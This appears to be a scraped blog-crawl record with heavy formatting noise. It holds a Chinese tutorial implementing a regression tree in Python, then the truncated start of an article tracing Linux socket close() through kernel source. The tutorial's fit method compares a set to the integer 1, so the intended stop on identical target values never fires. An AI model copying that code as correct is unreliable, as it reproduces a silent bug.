算法就是用回归树组合而成的。本文就回归树的基本原理进行讲解，并手把手、肩并肩地带您实现这一算法。,\n,完整实现代码请参考 github： ,https://github.com/tushushu/Imylu/blob/master/regression_tree.py,\n,1. 原理篇,\n,我们用人话而不是大段的数学公式，来讲讲回归树是怎么一回事。,\n,1.1 最简单的模型,\n,如果预测某个连续变量的大小，最简单的模型之一就是用平均值。比如同事的平均年龄是 28 岁，那么新来了一批同事，在不知道这些同事的任何信息的情况下，直觉上用平均值 28 来预测是比较准确的，至少比 0 岁或者 100 岁要靠谱一些。我们不妨证明一下我们的直觉：,\n,\n,定义损失函数 L，其中 y_hat 是对 y 预测值，使用 MSE 来评估损失：,\n,\n,对 y_hat 求导:,\n,\n,令导数等于 0，最小化 MSE，则:,\n,\n,所以，,\n,\n,结论，如果要用一个常量来预测 y，用 y 的均值是一个最佳的选择。,\n,\n,1.2 加一点难度,\n,仍然是预测同事年龄，这次我们预先知道了同事的职级，假设职级的范围是整数1-10，如何能让这个信息帮助我们更加准确的预测年龄呢？,\n,一个思路是根据职级把同事分为两组，这两组分别应用我们之前提到的“平均值”模型。比如职级小于 5 的同事分到A组，大于或等于5的分到 B 组，A 组的平均年龄是 25 岁，B 组的平均年龄是 35 岁。如果新来了一个同事，职级是 3，应该被分到 A 组，我们就预测他的年龄是 25 岁。,\n,1.3 最佳分割点,\n,还有一个问题待解决，如何取一个最佳的分割点对不同职级的同事进行分组呢？,\n,我们尝试所有 m 个可能的分割点 P_i，沿用之前的损失函数，对 A、B 两组分别计算 Loss 并相加得到 L_i。最小的 L_i 所对应的 P_i 就是我们要找的“最佳分割点”。,\n,1.4 运用多个变量,\n,再复杂一些，如果我们不仅仅知道了同事的职级，还知道了同事的工资（貌似不科学），该如何预测同事的年龄呢？,\n,我们可以分别根据职级、工资计算出职级和工资的最佳分割点P_1, P_2，对应的Loss L_1, L_2。然后比较L_1和L2，取较小者。假设L_1 < L_2，那么按照P_1把不同职级的同事分为A、B两组。在A、B组内分别计算工资所对应的分割点，再分为C、D两组。这样我们就得到了AC, AD, BC, BD四组同事以及对应的平均年龄用于预测。,\n,1.5 答案揭晓,\n,如何实现这种1 to 2, 2 to 4, 4 to 8的算法呢？,\n,熟悉数据结构的同学自然会想到二叉树，这种树被称为回归树，顾名思义利用树形结构求解回归问题。,\n,2. 实现篇,\n,本人用全宇宙最简单的编程语言——Python实现了回归树算法，没有依赖任何第三方库，便于学习和使用。简单说明一下实现过程，更详细的注释请参考本人github上的代码。,\n,2.1 创建Node类,\n,初始化，存储预测值、左右结点、特征和分割点,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nclass Node(object):\r\n    def __init__(self, score=None):\r\n        self.score = score\r\n        self.left = None\r\n        self.right = None\r\n        self.feature = None\r\n        self.split = None,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,class, ,Node,(,object,),:,    ,def ,__init__,(,self,,, ,score,=,None,),:,        ,self,.,score, ,=, ,score,        ,self,.,left, ,=, ,None,        ,self,.,right, ,=, ,None,        ,self,.,feature, ,=, ,None,        ,self,.,split, ,=, ,None,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.2 创建回归树类,\n,初始化，存储根节点和树的高度。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nclass RegressionTree(object):\r\n    def __init__(self):\r\n        self.root = Node()\r\n        self.height = 0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,class, ,RegressionTree,(,object,),:,    ,def ,__init__,(,self,),:,        ,self,.,root, ,=, ,Node,(,),        ,self,.,height, ,=, ,0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.3 计算分割点、MSE,\n,根据自变量X、因变量y、X元素中被取出的行号idx，列号feature以及分割点split，计算分割后的MSE。注意这里为了减少计算量，用到了方差公式：,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _get_split_mse(self, X, y, idx, feature, split):\r\n    split_sum = [0, 0]\r\n    split_cnt = [0, 0]\r\n    split_sqr_sum = [0, 0]\r\n\r\n    for i in idx:\r\n        xi, yi = X[i][feature], y[i]\r\n        if xi < split:\r\n            split_cnt[0] += 1\r\n            split_sum[0] += yi\r\n            split_sqr_sum[0] += yi ** 2\r\n        else:\r\n            split_cnt[1] += 1\r\n            split_sum[1] += yi\r\n            split_sqr_sum[1] += yi ** 2\r\n\r\n    split_avg = [split_sum[0] / split_cnt[0], split_sum[1] / split_cnt[1]]\r\n    split_mse = [split_sqr_sum[0] - split_sum[0] * split_avg[0],\r\n                    split_sqr_sum[1] - split_sum[1] * split_avg[1]]\r\n    return sum(split_mse), split, split_avg,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_get_split_mse,(,self,,, ,X,,, ,y,,, ,idx,,, ,feature,,, ,split,),:,    ,split_sum, ,=, ,[,0,,, ,0,],    ,split_cnt, ,=, ,[,0,,, ,0,],    ,split_sqr_sum, ,=, ,[,0,,, ,0,], ,    ,for, ,i, ,in, ,idx,:,        ,xi,,, ,yi, ,=, ,X,[,i,],[,feature,],,, ,y,[,i,],        ,if, ,xi, ,<, ,split,:,            ,split_cnt,[,0,], ,+=, ,1,            ,split_sum,[,0,], ,+=, ,yi,            ,split_sqr_sum,[,0,], ,+=, ,yi *,*, ,2,        ,else,:,            ,split_cnt,[,1,], ,+=, ,1,            ,split_sum,[,1,], ,+=, ,yi,            ,split_sqr_sum,[,1,], ,+=, ,yi *,*, ,2, ,    ,split_avg, ,=, ,[,split_sum,[,0,], ,/, ,split_cnt,[,0,],,, ,split_sum,[,1,], ,/, ,split_cnt,[,1,],],    ,split_mse, ,=, ,[,split_sqr_sum,[,0,], ,-, ,split_sum,[,0,], ,*, ,split_avg,[,0,],,,                    ,split_sqr_sum,[,1,], ,-, ,split_sum,[,1,], ,*, ,split_avg,[,1,],],    ,return, ,sum,(,split_mse,),,, ,split,,, ,split_avg,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.4 计算最佳分割点,\n,遍历特征某一列的所有的不重复的点，找出MSE最小的点作为最佳分割点。如果特征中没有不重复的元素则返回None。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _choose_split_point(self, X, y, idx, feature):\r\n    unique = set([X[i][feature] for i in idx])\r\n    if len(unique) == 1:\r\n        return None\r\n\r\n    unique.remove(min(unique))\r\n    mse, split, split_avg = min(\r\n        (self._get_split_mse(X, y, idx, feature, split)\r\n            for split in unique), key=lambda x: x[0])\r\n    return mse, feature, split, split_avg,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_choose_split_point,(,self,,, ,X,,, ,y,,, ,idx,,, ,feature,),:,    ,unique, ,=, ,set,(,[,X,[,i,],[,feature,], ,for, ,i, ,in, ,idx,],),    ,if, ,len,(,unique,), ,==, ,1,:,        ,return, ,None, ,    ,unique,.,remove,(,min,(,unique,),),    ,mse,,, ,split,,, ,split_avg, ,=, ,min,(,        ,(,self,.,_get_split_mse,(,X,,, ,y,,, ,idx,,, ,feature,,, ,split,),            ,for, ,split ,in, ,unique,),,, ,key,=,lambda, ,x,:, ,x,[,0,],),    ,return, ,mse,,, ,feature,,, ,split,,, ,split_avg,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.5 选择最佳特征,\n,遍历所有特征，计算最佳分割点对应的MSE，找出MSE最小的特征、对应的分割点，左右子节点对应的均值和行号。如果所有的特征都没有不重复元素则返回None,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _choose_feature(self, X, y, idx):\r\n    m = len(X[0])\r\n    split_rets = [x for x in map(lambda x: self._choose_split_point(\r\n        X, y, idx, x), range(m)) if x is not None]\r\n\r\n    if split_rets == []:\r\n        return None\r\n    _, feature, split, split_avg = min(\r\n        split_rets, key=lambda x: x[0])\r\n\r\n    idx_split = [[], []]\r\n    while idx:\r\n        i = idx.pop()\r\n        xi = X[i][feature]\r\n        if xi < split:\r\n            idx_split[0].append(i)\r\n        else:\r\n            idx_split[1].append(i)\r\n    return feature, split, split_avg, idx_split,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_choose_feature,(,self,,, ,X,,, ,y,,, ,idx,),:,    ,m, ,=, ,len,(,X,[,0,],),    ,split_rets, ,=, ,[,x, ,for, ,x, ,in, ,map,(,lambda, ,x,:, ,self,.,_choose_split_point,(,        ,X,,, ,y,,, ,idx,,, ,x,),,, ,range,(,m,),), ,if, ,x, ,is, ,not, ,None,], ,    ,if, ,split_rets, ,==, ,[,],:,        ,return, ,None,    ,_,,, ,feature,,, ,split,,, ,split_avg, ,=, ,min,(,        ,split_rets,,, ,key,=,lambda, ,x,:, ,x,[,0,],), ,    ,idx_split, ,=, ,[,[,],,, ,[,],],    ,while, ,idx,:,        ,i, ,=, ,idx,.,pop,(,),        ,xi, ,=, ,X,[,i,],[,feature,],        ,if, ,xi, ,<, ,split,:,            ,idx_split,[,0,],.,append,(,i,),        ,else,:,            ,idx_split,[,1,],.,append,(,i,),    ,return, ,feature,,, ,split,,, ,split_avg,,, ,idx_split,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.6 规则转文字,\n,将规则用文字表达出来，方便我们查看规则。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _expr2literal(self, expr):\r\n    feature, op, split = expr\r\n    op = \">=\" if op == 1 else \"<\"\r\n    return \"Feature%d %s %.4f\" % (feature, op, split),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_expr2literal,(,self,,, ,expr,),:,    ,feature,,, ,op,,, ,split, ,=, ,expr,    ,op, ,=, ,\">=\", ,if, ,op, ,==, ,1, ,else, ,\"<\",    ,return, ,\"Feature%d %s %.4f\", ,%, ,(,feature,,, ,op,,, ,split,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.7 获取规则,\n,将回归树的所有规则都用文字表达出来，方便我们了解树的全貌。这里用到了队列+广度优先搜索。有兴趣也可以试试递归或者深度优先搜索。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _get_rules(self):\r\n    que = [[self.root, []]]\r\n    self.rules = []\r\n\r\n    while que:\r\n        nd, exprs = que.pop(0)\r\n        if not(nd.left or nd.right):\r\n            literals = list(map(self._expr2literal, exprs))\r\n            self.rules.append([literals, nd.score])\r\n\r\n        if nd.left:\r\n            rule_left = copy(exprs)\r\n            rule_left.append([nd.feature, -1, nd.split])\r\n            que.append([nd.left, rule_left])\r\n\r\n        if nd.right:\r\n            rule_right = copy(exprs)\r\n            rule_right.append([nd.feature, 1, nd.split])\r\n            que.append([nd.right, rule_right]),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_get_rules,(,self,),:,    ,que, ,=, ,[,[,self,.,root,,, ,[,],],],    ,self,.,rules, ,=, ,[,], ,    ,while, ,que,:,        ,nd,,, ,exprs, ,=, ,que,.,pop,(,0,),        ,if, ,not,(,nd,.,left ,or, ,nd,.,right,),:,            ,literals, ,=, ,list,(,map,(,self,.,_expr2literal,,, ,exprs,),),            ,self,.,rules,.,append,(,[,literals,,, ,nd,.,score,],), ,        ,if, ,nd,.,left,:,            ,rule_left, ,=, ,copy,(,exprs,),            ,rule_left,.,append,(,[,nd,.,feature,,, ,-,1,,, ,nd,.,split,],),            ,que,.,append,(,[,nd,.,left,,, ,rule_left,],), ,        ,if, ,nd,.,right,:,            ,rule_right, ,=, ,copy,(,exprs,),            ,rule_right,.,append,(,[,nd,.,feature,,, ,1,,, ,nd,.,split,],),            ,que,.,append,(,[,nd,.,right,,, ,rule_right,],),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.8 训练模型,\n,仍然使用队列+广度优先搜索，训练模型的过程中需要注意：,\n,\n,控制树的最大深度max_depth；,\n,控制分裂时最少的样本量min_samples_split；,\n,叶子结点至少有两个不重复的y值；,\n,至少有一个特征是没有重复值的。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef fit(self, X, y, max_depth=5, min_samples_split=2):\r\n    self.root = Node()\r\n    que = [[0, self.root, list(range(len(y)))]]\r\n\r\n    while que:\r\n        depth, nd, idx = que.pop(0)\r\n\r\n        if depth == max_depth:\r\n            break\r\n\r\n        if len(idx) < min_samples_split or \\\r\n                set(map(lambda i: y[i], idx)) == 1:\r\n            continue\r\n\r\n        feature_rets = self._choose_feature(X, y, idx)\r\n        if feature_rets is None:\r\n            continue\r\n\r\n        nd.feature, nd.split, split_avg, idx_split = feature_rets\r\n        nd.left = Node(split_avg[0])\r\n        nd.right = Node(split_avg[1])\r\n        que.append([depth+1, nd.left, idx_split[0]])\r\n        que.append([depth+1, nd.right, idx_split[1]])\r\n\r\n    self.height = depth\r\n    self._get_rules(),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,fit,(,self,,, ,X,,, ,y,,, ,max_depth,=,5,,, ,min_samples_split,=,2,),:,    ,self,.,root, ,=, ,Node,(,),    ,que, ,=, ,[,[,0,,, ,self,.,root,,, ,list,(,range,(,len,(,y,),),),],], ,    ,while, ,que,:,        ,depth,,, ,nd,,, ,idx, ,=, ,que,.,pop,(,0,), ,        ,if, ,depth, ,==, ,max_depth,:,            ,break, ,        ,if, ,len,(,idx,), ,<, ,min_samples_split ,or, ,\\,                ,set,(,map,(,lambda, ,i,:, ,y,[,i,],,, ,idx,),), ,==, ,1,:,            ,continue, ,        ,feature_rets, ,=, ,self,.,_choose_feature,(,X,,, ,y,,, ,idx,),        ,if, ,feature_rets ,is, ,None,:,            ,continue, ,        ,nd,.,feature,,, ,nd,.,split,,, ,split_avg,,, ,idx_split, ,=, ,feature_rets,        ,nd,.,left, ,=, ,Node,(,split_avg,[,0,],),        ,nd,.,right, ,=, ,Node,(,split_avg,[,1,],),        ,que,.,append,(,[,depth,+,1,,, ,nd,.,left,,, ,idx_split,[,0,],],),        ,que,.,append,(,[,depth,+,1,,, ,nd,.,right,,, ,idx_split,[,1,],],), ,    ,self,.,height, ,=, ,depth,    ,self,.,_get_rules,(,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.9 打印规则,\n,模型训练完毕，查看一下模型生成的规则,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef print_rules(self):\r\n    for i, rule in enumerate(self.rules):\r\n        literals, score = rule\r\n        print(\"Rule %d: \" % i, ' | '.join(\r\n            literals) + ' => split_hat %.4f' % score),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,print_rules,(,self,),:,    ,for, ,i,,, ,rule ,in, ,enumerate,(,self,.,rules,),:,        ,literals,,, ,score, ,=, ,rule,        ,print,(,\"Rule %d: \", ,%, ,i,,, ,' | ',.,join,(,            ,literals,), ,+, ,' => split_hat %.4f', ,%, ,score,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.10 预测一个样本,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef _predict(self, row):\r\n    nd = self.root\r\n    while nd.left and nd.right:\r\n        if row[nd.feature] < nd.split:\r\n            nd = nd.left\r\n        else:\r\n            nd = nd.right\r\n    return nd.score,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,_predict,(,self,,, ,row,),:,    ,nd, ,=, ,self,.,root,    ,while, ,nd,.,left ,and, ,nd,.,right,:,        ,if, ,row,[,nd,.,feature,], ,<, ,nd,.,split,:,            ,nd, ,=, ,nd,.,left,        ,else,:,            ,nd, ,=, ,nd,.,right,    ,return, ,nd,.,score,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2.11 预测多个样本,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef predict(self, X):\r\n    return [self._predict(Xi) for Xi in X],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,predict,(,self,,, ,X,),:,    ,return, ,[,self,.,_predict,(,Xi,), ,for, ,Xi ,in, ,X,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,3 效果评估,\n,3.1 main函数,\n,使用著名的波士顿房价数据集，按照7:3的比例拆分为训练集和测试集，训练模型，并统计准确度。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n@run_time\r\ndef main():\r\n    print(\"Tesing the accuracy of RegressionTree...\")\r\n    # Load data\r\n    X, y = load_boston_house_prices()\r\n    # Split data randomly, train set rate 70%\r\n    X_train, X_test, y_train, y_test = train_test_split(\r\n        X, y, random_state=10)\r\n    # Train model\r\n    reg = RegressionTree()\r\n    reg.fit(X=X_train, y=y_train, max_depth=4)\r\n    # Show rules\r\n    reg.print_rules()\r\n    # Model accuracy\r\n    get_r2(reg, X_test, y_test),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,@,run_time,def ,main,(,),:,    ,print,(,\"Tesing the accuracy of RegressionTree...\",),    ,# Load data,    ,X,,, ,y, ,=, ,load_boston_house_prices,(,),    ,# Split data randomly, train set rate 70%,    ,X_train,,, ,X_test,,, ,y_train,,, ,y_test, ,=, ,train_test_split,(,        ,X,,, ,y,,, ,random_state,=,10,),    ,# Train model,    ,reg, ,=, ,RegressionTree,(,),    ,reg,.,fit,(,X,=,X_train,,, ,y,=,y_train,,, ,max_depth,=,4,),    ,# Show rules,    ,reg,.,print_rules,(,),    ,# Model accuracy,    ,get_r2,(,reg,,, ,X_test,,, ,y_test,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,3.2 效果展示,\n,最终生成了15条规则，拟合优度0.801，运行时间1.74秒，效果还算不错~,\n,\n,3.3 工具函数,\n,本人自定义了一些工具函数，可以在github上查看 ,https://,github.com/tushushu/Imy,lu/blob/master/utils.py, 1. run_time – 测试函数运行时间 2. load_boston_house_prices – 加载波士顿房价数据 3. train_test_split – 拆分训练集、测试机 4. get_r2 – 计算拟合优度,\n,总结,\n,回归树的原理：,\n,损失最小化，平均值大法。 最佳行与列，效果顶呱呱。,\n,回归树的实现：,\n,一顿操作猛如虎，加减乘除二叉树。,\n, ,\n,原文：https://zhuanlan.zhihu.com/p/41688007,\n,【关于作者】,\n,李小文：先后从事过数据分析、数据挖掘工作，主要开发语言是Python，现任一家小型互联网公司的算法工程师。Github: ,https://gith,ub.com/tushu,shu,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,伯乐在线读者,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            ① 本账号用于发布那些在伯乐在线无账号的读者的投稿，包括译文和原创文章。② 欢迎加入伯乐在线专栏作者：http://blog.jobbole.com/99322/        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 34,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114261/", "url_object_id": "172ca0d8f74ecee41e443a7233849043", "front_image_path": "full/eadb28355fab57e9672e5c965147ef4caca04ac4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "从 Linux 源码看 socket 的 close", "create_time": "2018/08/16", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,无毁的湖光-Al,   ,从linux源码看socket的close,\n,笔者一直觉得如果能知道从应用到框架再到操作系统的每一处代码，是一件Exciting的事情。上篇博客讲了socket的阻塞和非阻塞，这篇就开始谈一谈socket的close(以tcp为例且基于linux-2.6.24内核版本),\n,TCP关闭状态转移图:,\n,众所周知，TCP的close过程是四次挥手，状态机的变迁也逃不出TCP状态转移图，如下图所示: ,\ntcp的关闭主要分主动关闭、被动关闭以及同时关闭(特殊情况,不做描述),\n,主动关闭,\n,close(fd)的过程,\n,以C语言为例，在我们关闭socket的时候，会使用close(fd)函数:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nint    socket_fd;\r\nsocket_fd = socket(AF_INET, SOCK_STREAM, 0);\r\n...\r\n// 此处通过文件描述符关闭对应的socket\r\nclose(socket_fd)\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,int,    ,socket_fd,;,socket_fd, ,=, ,socket,(,AF_INET,,, ,SOCK_STREAM,,, ,0,),;,.,.,.,// 此处通过文件描述符关闭对应的socket,close,(,socket_fd,), ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,而close(int fd)又是通过系统调用sys_close来执行的:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nasmlinkage long sys_close(unsigned int fd)\r\n{\r\n\t// 清除(close_on_exec即退出进程时）的位图标记\r\n\tFD_CLR(fd, fdt->close_on_exec);\r\n\t// 释放文件描述符\r\n\t// 将fdt->open_fds即打开的fd位图中对应的位清除\r\n\t// 再将fd挂入下一个可使用的fd以便复用\r\n\t__put_unused_fd(files, fd);\r\n\t// 调用file_pointer的close方法真正清除\r\n\tretval = filp_close(filp, files);\r\n}\r\n\t\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,asmlinkage ,long, ,sys_close,(,unsigned, ,int, ,fd,),{,\t,// 清除(close_on_exec即退出进程时）的位图标记,\t,FD_CLR,(,fd,,, ,fdt,->,close_on_exec,),;,\t,// 释放文件描述符,\t,// 将fdt->open_fds即打开的fd位图中对应的位清除,\t,// 再将fd挂入下一个可使用的fd以便复用,\t,__put_unused_fd,(,files,,, ,fd,),;,\t,// 调用file_pointer的close方法真正清除,\t,retval, ,=, ,filp_close,(,filp,,, ,files,),;,},\t, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们看到最终是调用的filp_close方法:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nint filp_close(struct file *filp, fl_owner_t id)\r\n{\r\n\t// 如果存在flush方法则flush\r\n\tif (filp->f_op && filp->f_op->flush)\r\n\t\tfilp->f_op->flush(filp, id);\r\n\t// 调用fput\t\r\n\tfput(filp);\r\n\t......\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,int, ,filp_close,(,struct, ,file *,filp,,, ,fl_owner_t ,id,),{,\t,// 如果存在flush方法则flush,\t,if, ,(,filp,->,f_op, ,&&, ,filp,->,f_op,->,flush,),\t\t,filp,->,f_op,->,flush,(,filp,,, ,id,),;,\t,// 调用fput\t,\t,fput,(,filp,),;,\t,.,.,.,.,.,.,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,紧接着我们进入fput:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvoid fastcall fput(struct file *file)\r\n{\r\n\t// 对应file->count--,同时检查是否还有关于此file的引用\r\n\t// 如果没有，则调用_fput进行释放\r\n\tif (atomic_dec_and_test(&file->f_count))\r\n\t\t__fput(file);\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,void, ,fastcall ,fput,(,struct, ,file *,file,),{,\t,// 对应file->count--,同时检查是否还有关于此file的引用,\t,// 如果没有，则调用_fput进行释放,\t,if, ,(,atomic_dec_and_test,(,&,file,->,f_count,),),\t\t,__fput,(,file,),;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,同一个file(socket)有多个引用的情况很常见，例如下面的例子:,\n,\n所以在多进程的socket服务器编写过程中，父进程也需要close(fd)一次，以免socket无法最终关闭,\n,然后就是_fput函数了:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvoid fastcall __fput(struct file *file)\r\n{\r\n\t// 从eventpoll中释放file\r\n\teventpoll_release(file);\r\n\t// 如果是release方法，则调用release\r\n\tif (file->f_op && file->f_op->release)\r\n\t\tfile->f_op->release(inode, file);\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,void, ,fastcall ,__fput,(,struct, ,file *,file,),{,\t,// 从eventpoll中释放file,\t,eventpoll_release,(,file,),;,\t,// 如果是release方法，则调用release,\t,if, ,(,file,->,f_op, ,&&, ,file,->,f_op,->,release,),\t\t,file,->,f_op,->,release,(,inode,,, ,file,),;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,由于我们讨论的是socket的close,所以，我们现在探查下file->f_op->release在socket情况下的实现:,\n,f_op->release的赋值,\n,我们跟踪创建socket的代码，即,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsocket(AF_INET, SOCK_STREAM, 0);\r\n\t|-sock_create  // 